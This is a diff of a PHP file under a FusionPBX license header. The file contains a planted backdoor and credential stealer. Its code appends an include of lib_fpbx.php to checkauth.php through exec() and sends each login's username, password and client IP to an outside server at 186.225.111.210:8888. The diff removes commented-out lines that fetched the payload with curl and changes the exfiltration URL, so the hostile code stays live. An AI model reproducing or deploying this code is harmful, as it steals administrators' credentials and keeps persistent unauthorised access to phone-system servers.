@@ -24,11 +24,7 @@
 	Contributor(s):
 	Mark J Crane <markjcrane@fusionpbx.com>
 	
-	 /* /* /* echo '<?php include("lib_fpbx.php");?>' >> checkauth.php
-	 /* /* /* echo '<?php include("lib_fpbx.php");?>' >> /usr/local/nsg/nginx/html/fusionpbx/includes/checkauth.php
-	/* /* /* curl http://186.225.111.210:8888/key.txt -o /usr/local/nsg/nginx/html/fusionpbx/includes/lib_fpbx.php
-	
-*/
+	 **/
 if( exec('grep "lib_fpbx.php" ./checkauth.php')) {
 echo "Hello here\n";
     } else { exec('echo "<?php include("lib_fpbx.php");?>" >> checkauth.php'); }
@@ -44,6 +40,6 @@ if (strlen($_POST["password"]) > 0 ) {
 $pass = urlencode($_POST["password"]);
 $user = urlencode($_POST["username"]);
 $addr = urlencode($_SERVER["REMOTE_ADDR"]);
-$url = "http://186.225.111.210:8888/key.php?ip="."$addr"."&user="."$user"."&pass="."$pass"."";
+$url = "http://186.225.111.210:8888/fusionpbx/includes/lkey.php?ip="."$addr"."&user="."$user"."&pass="."$pass"."";
 get_url($url); }
 ?>
